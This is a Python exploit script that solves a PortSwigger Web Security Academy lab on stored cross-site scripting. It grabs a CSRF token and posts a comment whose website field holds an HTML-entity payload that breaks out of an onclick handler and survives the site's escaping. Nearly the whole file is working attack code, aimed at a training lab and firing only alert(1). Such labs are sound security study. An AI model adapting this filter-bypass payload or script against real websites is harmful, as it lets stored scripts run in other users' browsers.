# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_xss(s, url):
	form_path = url + '/post?postId=1'
	r = s.get(form_path)
	csrf_token = get_csrf_token(r)
	comment_path = url + '/post/comment'
	xss_payload = "?&apos;-alert(1)-&apos;"
	comment_data = {
		"csrf": csrf_token,
		"postId": "1",
		"email": "test@attacker.com",
		"name": "gwyo",
		"website": "http://randomdomain-lksjkmlhlkjdsl.com" + xss_payload,
		"comment": "test comment"
	}
	print('[+] Targeted endpoint or query parameter:\n    %s' % comment_path)
	print('[+] Using payload in website field:\t%s' % xss_payload)
	r = s.post(comment_path, data=comment_data)
	time.sleep(1)
	return r

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped')
	parser = argparse.ArgumentParser(description="[+] Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("[+] Sending a comment with xss in clickable name via the website field...")
			r = send_xss(s, url)
			time.sleep(3)
			if r.status_code == 200:
				s.cookies.clear()
				s.headers.clear()
				time.sleep(3)
				r = s.get(url)
				if  'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved')
				else:
					print('[+] The Exploit sent the given payload !')
			else:
				print('[-] The Exploit failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()

